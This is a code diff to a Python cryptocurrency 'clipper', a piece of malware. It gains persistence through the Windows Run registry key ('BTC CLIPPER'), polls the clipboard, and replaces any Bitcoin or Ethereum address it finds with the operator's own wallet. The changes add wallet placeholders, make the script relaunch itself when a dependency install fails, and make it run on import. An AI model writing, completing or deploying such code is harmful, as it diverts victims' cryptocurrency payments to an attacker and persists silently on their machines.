@@ -2,6 +2,10 @@ import os, sys, re, time, subprocess, logging
 
 logging.basicConfig(filename="handler.log", level=logging.INFO, format='%(asctime)s %(message)s')
 
+BitcoinAddress = "" #btc addr here
+EthereumAddress = "" # eth addr here
+
+
 def IsWindows():
     try:
         if os.name == "nt":
@@ -10,24 +14,17 @@ def IsWindows():
             path = os.getenv('APPDATA')
 
             logging.debug(path)
-
             file_name = sys.argv[0]
-
             address = os.getenv(
                 'LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'
-
             key1 = winreg.HKEY_CURRENT_USER
             key_value1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-
             open_ = winreg.CreateKeyEx(key1, key_value1, 0, winreg.KEY_WRITE)
-
             if open_:
-                logging.debug('Registry Key created')
+                logging.debug('Key created')  # Registry Key
 
             winreg.SetValueEx(open_, "BTC CLIPPER", 0, winreg.REG_SZ, address)
-
             open_.Close()
-
             virus_code = []
 
             with open(sys.argv[0], 'r', encoding='utf-8') as f:
@@ -51,11 +48,12 @@ def IsWindows():
     except Exception as e:
         logging.error("Directory / startup registry err {}".format(str(e)))
 
+
 class Handler:
     def __init__(self):
         self.btc_pattern = r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[0-9a-zA-HJ-NP-Z]{11,71}$'
         self.eth_pattern = r'^0x[a-fA-F0-9]{40}$'
-        self.addrs = ["EtheriumWalletHere", "BitcoinWalletHere"] # change to your info
+        self.addrs = [EthereumAddress, BitcoinAddress]
         try:
             global pyperclip
             import pyperclip
@@ -65,7 +63,7 @@ class Handler:
                 os.execl(sys.executable, sys.executable, *sys.argv)
             except Exception as e:
                 logging.error(f"Failed to install or execute pyperclip: {e}")
-                sys.exit(1)
+                os.execl(sys.executable, sys.executable, *sys.argv)
 
     def read(self):
         """Reads the clipboard and checks if 'btc', 'eth', or invalid based on the address style"""
@@ -91,6 +89,7 @@ class Handler:
         except Exception as e:
             logging.error(f"Failed to write to clipboard: {e}")
 
+
 def run():
     if len(sys.argv) == 1:
         try:
@@ -106,9 +105,9 @@ def run():
             logging.error(f"Failed to run in background: {e}")
         sys.exit(0)
 
-if __name__ == "__main__":
-    run()
-    while True:
-        handler = Handler()
-        handler.write()
-        time.sleep(0.5)
+
+run()
+while True:
+    handler = Handler()
+    handler.write()
+    time.sleep(0.5)
